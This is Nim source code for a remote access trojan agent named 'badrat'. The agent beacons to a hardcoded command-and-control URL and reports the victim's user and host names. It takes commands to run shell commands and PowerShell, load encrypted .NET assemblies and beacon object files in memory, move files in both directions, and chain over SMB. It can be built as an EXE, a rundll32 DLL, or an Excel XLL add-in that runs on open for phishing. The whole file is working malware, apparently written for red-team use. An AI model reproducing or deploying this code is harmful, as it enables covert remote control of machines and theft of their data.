import nicoff
from BeaconFunctions import BeaconGetOutputData

import puppy
import winim/clr
import winim/lean

import os
import json
import osproc
import random
import strutils
import sequtils
import base64

# Values for the agent. Change these values before you compile!
const sleep: int = 2000 # In milliseconds
const staticHome: string = "http://172.16.113.1:8080/test"
const userAgent: string = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"

const xFrameOptions = "SAMEORIGIN"
const contentType = "text/xml"

const typ: string = "nim"
let un: string = getEnv("username", "unknown")
let hn: string = getEnv("computername", "unknown")
randomize()
let id: string = $rand(2_147_483_647) # int32 max

var links: seq[string] = @[]

proc post(home, response: string): string =
  ## Posts json string `data` to the `home` URL
  ## Returns the response from the server as a string
  ## Supports both HTTP and SMB/local-file paths as `home` values
  if(home.startswith("http://") or home.startswith("https://")):
    var headers: seq[Header]
    headers.add(Header(key: "User-Agent", value: userAgent))
    headers.add(Header(key: "X-Frame-Options", value: xFrameOptions))
    headers.add(Header(key: "Content-Type", value: contentType))

    let req = Request(url: parseUrl(home), verb: "POST", timeout: 2000, headers: headers, body: response)
    var res: Response
    res = fetch(req)
    result = "{" & res.body.split('{')[1..^1].join("{").split('\n')[0] # remove HTML tags that get included with each POST req
  else: # file path
    if(not home.fileExists()): # Create empty file if it doesn't exist
      home.open(mode = fmReadWrite).close()

    let file = home.open(mode = fmReadWriteExisting)
    var updata = file.readAll()
    file.close()
    
    if(updata == "" or updata != response):
      result = updata
      home.writeFile(response)

proc to_byte_seq(str: string): seq[byte] {.inline.} =
  # Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc zor(data, key: string): string =
  ## XOR [en|de]crypts the following data with the key.
  ## Returns the XOR crypted data. All data is bytes
  for (x, y) in zip(data, key.cycle(data.len)):
    result.add(chr(ord(x) xor ord(y)))

proc cmd(cmdline: string): string =
  ## Runs the command specified by `cmdline` and returns
  ## the output of the command. Waits until execution finishes
  try:
    result = execCmdEx(cmdline)[0]
  except Exception as e:
    result = $e.name & " " & $e.msg

proc exec(cmdline: string): string =
  ## Runs the command line in the background and
  ## does not wait for output to be returned
  var cmdline = cmdline.split(' ')[1..^1].join(" ")
  cmdline = decode(cmdline)
  try:
    let process = startProcess(cmdline, options={poUsePath, poEvalCommand})
    result = "[+] Successfully started process " & $process.processID & " (no output)"
  except Exception as e:
    result = "[-] Failed to start process\n" & $e.name & " " & $e.msg

proc upload(data, path: string): string =
  ## Writes the binary `data` to the specified `path`.
  ## Throws an exception if the agent cannot write to the path
  try:
    writeFile(path, data)
    result = "[+] " & $data.len & " bytes written to " & path & " successfully"
  except Exception as e:
    result = "[-] Error: Couldn't write file to path " & path & "\n" & $e.name & " " & $e.msg

proc download(path: string): (bool, string) =
  ## Reads binary data from `path` and returns it.
  ## Also returns `true` if successful. If failed,
  ## Returns `false` and the error message
  try:
    let data = readFile(path)
    result = (true, data)
  except Exception as e:
    let error = "[-] Error: Couldn't read file from path " & path & "\n" & $e.name & " " & $e.msg
    result = (false, error)

proc execAssembly(data, args: string): string =
  ## Loads the assembly in `data`, executes it with `arguments`
  ## captures the `Console.WriteLine()` stdout into a buffer,
  ## then returns that output buffer

  # Parse the arguments
  var assemblyArgs: seq[string]
  var args = args.strip(chars = {'"'})
  if(args == "  "):
    assemblyArgs = @[] # null args
  else:
    assemblyArgs = args.split("\",\"") # Split on quote-comma-quote ( "," )

  # Load the assembly in...
  var assembly = load(data.to_byte_seq)

  # Convert args to CLR compatible args
  var arr = toCLRVariant(assemblyArgs, VT_BSTR)

  # Redirect console output to a variable -- we need to use the CLR to do this
  # Load the proper libraries
  var mscor = load("mscorlib")

  # Create the objects required to redirect output
  var Console = mscor.GetType("System.Console")
  var prevConOut = mscor.GetType("System.IO.TextWriter")
  var sw = mscor.new("System.IO.StringWriter")

  # Start the redirection of Console.Out
  prevConOut = @Console.Out
  @Console.SetOut(sw)

  # Run the assembly
  assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

  # Put output back, stop redirecting Console.Out
  @Console.SetOut(prevConOut)
  result = sw.ToString()

proc execPsh(data: string): string = 
  ## Execs the given `data` as powershell code
  let Automation = load("System.Management.Automation")
  let RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
  let runspace = @RunspaceFactory.CreateRunspace()
  runspace.Open()
  
  let pipeline = runspace.CreatePipeline()
  pipeline.Commands.AddScript(data)
  try:
    let output = pipeline.Invoke()
    for line in output:
      result.add($line & '\n')

  except Exception as e:
    result = "[-] Error exec'ing Powershell. Did you typo / invalid syntax?\n" & $e.name & " " & $e.msg

proc link(linkpath: string): string =
  ## Add a downstream SMB link to the chain
  if(linkpath notin links):
    links.add(linkpath)
    result = "[*] Added link to: " & linkpath
  else:
    result = "[-] Link already exists: " & linkpath

proc unlink(linkpath: string): string = 
  ## Remove a downstream SMB link from the chain
  if(linkpath == "all"):
    links = @[]
    result = "[*] Removed all links"
  elif(linkpath in links):
    links.delete(links.find(linkpath))
    result = "[*] Removed link to: " & linkpath
  else:
    result = "[-] No such link exists: " & linkpath

proc coffer(command: string): string =
  ## Wrap the NiCoff RunCOFF function
  const functionName = "go"
  
  let command = command.split(' ')
  let bof_file: seq[byte] = command[1].decode.to_byte_seq
  var arg_data: seq[byte]
  if(command.len == 3):
    arg_data = command[2].decode.to_byte_seq

  if(RunCOFF(functionName, bof_file, arg_data)):
    var outData: ptr char = BeaconGetOutputData(NULL)
    if(outData != NULL):
      result = $outData
  else:
    result = "[-] Bof failed..."
  
proc cd(path: string): string = 
  ## Change the rat's current directory and report errors if it didn't work
  try:
    setCurrentDir(path)
    result = "Current directory: " & path
  except Exception as e:
    result = "[!] Could not change directory:\n" & $e.name & " " & $e.msg


proc main(args: seq[string]) =
  ## Main function for the badrat agent ... handle cmdline arg for home path
  # If given, use the first cmdline parameter as the "call-home path"
  # else, use the static URL/path defined above (staticHome)
  var home = staticHome
  if(args.len > 0):
    home = args[0]

  # First checkin package
  var checkin: string = """{ "p":[ {"type": """" & typ & """", "id": """ & id & ""","un":"""" & un & """","hn":"""" & hn & """"} ] }"""
  
  # Main agent execution loop
  while(true):
    try:
      let serverMsg = post(home, checkin)
      if(serverMsg == ""): # serverMsg is empty ... sleep tight and try again
        sleep(sleep)
        continue

      let jsObject = parseJson(serverMsg)
      checkin = """{ "p":[ """ # start building json response string
      var recv_package: bool = false

      # Check for downstream linked child rats
      if(links.len() > 0):
        for link in links:
          try:
            var updata = ""
            updata = readFile(link)
            if(updata != serverMsg):
              let updata_dict = parseJson(updata)
              checkin = checkin & ($updata_dict["p"]).strip(chars ={'[',']'}) & ","
              link.writeFile(serverMsg)
          except:
            discard "pass"

      let packages = jsObject["p"]
      for package in packages:
        if($package["id"].getStr == id):
          recv_package = true
          if(package.hasKey("cmnd") and package["cmnd"].getStr != ""):
            let cmnd = package["cmnd"].getStr
            var rettype = "retval"
            var retval: string = ""

            if(cmnd == "quit"):
              quit()
            elif(cmnd == "spawn"):
              retval = "[-] Bro just upload a dll and run it with rundll32 or something"
            elif(cmnd.startsWith("shc ")):
              retval = "[-] Unsupported in this langauge ... for now >:D"
            elif(cmnd.startsWith("dl ")):
              var success: bool
              let path = cmnd.split(' ')[1]
              (success, retval) = download(path)
              if(success):
                rettype = "dl"
            elif(cmnd.startsWith("up ")):
              let data = decode(cmnd.split(' ')[1])
              let path = cmnd.split(' ')[2]
              retval = upload(data, path)
            elif(cmnd.startsWith("li ")):
              retval = link(cmnd.split(' ')[1..^1].join(" "))
            elif(cmnd.startsWith("ul ")):
              retval = unlink(cmnd.split(' ')[1..^1].join(" "))
            elif(cmnd.startsWith("cs ")):
              let asmData = zor(decode(cmnd.split(' ')[1]), id)
              retval = execAssembly(asmData, cmnd.split(' ')[2..^1].join(" "))
            elif(cmnd.startsWith("psh ")):
              retval = execPsh(decode(cmnd.split(' ')[1]))
            elif(cmnd.startsWith("bof ")):
              retval = coffer(cmnd)
            elif(cmnd.startsWith("ex ")):
              retval = exec(cmnd)
            elif(cmnd.startsWith("cd ")):
              retval = cd(cmnd.split(' ')[1])
            else: # shell command
              retval = cmd(cmnd)
            
            if(retval == ""):
              retval = "[*] No results to return or error getting result data"
            
            checkin = checkin & """{"type": """" & typ & """", "id": """ & id & ""","un":"""" & un & """","hn":"""" & hn & """","""" & rettype & """":"""" & encode(retval) & """"} ] }"""

          else: # Handle the case where there is no cmnd given to the agent
            checkin = checkin & """{"type": """" & typ & """", "id": """ & id & ""","un":"""" & un & """","hn":"""" & hn & """"} ] }"""

      if(not recv_package):
        checkin = checkin & """{"type": """" & typ & """", "id": """ & id & ""","un":"""" & un & """","hn":"""" & hn & """"} ] }"""
    
    except Exception as e:
      echo "ERROR: " & $e.name & " " & $e.msg
      checkin = """{ "p":[ {"type": """" & typ & """", "id": """ & id & ""","un":"""" & un & """","hn":"""" & hn & """"} ] }""" # Default checkin in case of error
    finally:
      sleep(sleep)

# Code specifically used to make the Nim DLL agent
when(defined(dll)):
  proc NimMain() {.cdecl, importc.}
    ## Import NimMain -- we need to call this pre-defined C function before starting /our/ main() function

  proc Run(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
    ## Exported DllMain function. Execution starts here for a DLL
    ## Run with: rundll32.exe badrat.dll,Run
    ## or
    ## rundll32.exe badrat.dll,Run <home>
    NimMain()
    main(commandLineParams()[1..^1])
    return true

# compile-time #define for Micrsoft Excel add-on, AKA XLL file: https://github.com/Octoberfest7/XLL_Phishing
elif(defined(xll)):
  proc NimMain() {.cdecl, importc.}
    ## Import NimMain -- we need to call this pre-defined C function before starting /our/ main() function

  proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
    main() # Hope you hard-coded the call-home address because you can't specify arguments to an AutoOpen Office XLL
  proc xlAutoClose() {.stdcall, exportc, dynlib.} =
    main()
  

  proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
    NimMain()
    return true

else: # EXE version of Nim agent
  main(commandLineParams())
